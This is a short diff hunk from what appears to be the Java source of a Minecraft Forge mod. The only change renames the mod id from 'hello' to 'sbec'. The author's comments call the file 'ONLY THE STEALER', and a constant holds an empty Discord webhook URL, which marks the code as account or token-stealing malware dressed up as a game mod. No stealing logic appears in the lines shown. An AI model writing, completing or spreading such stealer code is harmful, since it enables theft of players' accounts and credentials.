@@ -21,7 +21,7 @@ import java.net.URL;
 // THIS IS ONLY THE STEALER
 // I WILL NOT UPLOAD ANYTHING ELSE BESIDES THAT!!! 
 
-@Mod(modid = "hello") // some random modid
+@Mod(modid = "sbec") // some random modid
 public class sbec{
     // For DC Webhook
     private static final String WEBHOOK_URL = "";
